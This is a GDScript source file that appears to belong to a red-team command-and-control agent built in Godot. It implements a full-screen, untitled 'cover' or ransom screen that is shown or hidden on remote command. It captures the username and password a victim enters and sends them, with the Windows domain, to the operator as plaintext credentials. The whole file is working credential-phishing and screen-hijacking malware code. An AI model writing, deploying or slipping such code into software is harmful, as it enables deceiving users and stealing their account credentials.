extends Node

var display_size
var parent
var gui
var api
var task_id

func _ready():
	display_size = Vector2(1024,768)
	parent = $".".get_parent()

	api = parent.get_node("api")
	gui = parent.get_node("CoverGUI")

func show():
	get_window().set_title("")
	var _donotcare = OS.set_thread_name("")

	DisplayServer.window_set_mode(DisplayServer.WINDOW_MODE_MAXIMIZED)
	DisplayServer.window_set_size(DisplayServer.screen_get_size(0), 0)

	gui.show()

func hide():
	gui.hide()

	get_window().set_title("")
	var _donotcare = OS.set_thread_name("")
	get_window().size = Vector2(1,1)
	gui.position = Vector2(-1,-1)

func _on_tasking_cover(task):

	if task.has("command") and task.get("command") == "cover":
		var test_json_conv = JSON.new()
		test_json_conv.parse(task.get("parameters"))
		var parameters = test_json_conv.get_data()
		var state = float(parameters.get("state"))
		var output = "Cover Hidden"

		if state == 0:
			hide()
		else:
			show()
			output = "Cover Active - Hey, who turned out the lights?"

		api.send_agent_response(
			api.create_task_response(
				true,
				false,
				task.get("id"),
				output,
			)
		)
	else:
		print("bad ransom task: ", task)
	# TODO: agent_response in failure cases

func _on_GUI_verify_username_password(username, password):
	hide() # TODO: or just keep it up until the redteam member decides it should go away?
	
	var realm = "UNKNOWN REALM"

	if OS.has_environment("USERDOMAIN"):
		realm = OS.get_environment("USERDOMAIN")

	api.send_agent_response(
		api.create_task_response(
			true,
			true,
			task_id,
			"ransom screen collected credentials",
			[],
			[
				{
					"comment": "untrusted credential source (ransom screen)",
					"credential_type": "plaintext",
					"realm": realm,
					"credential": password,
					"account": username,
				}
			]
		)
	)
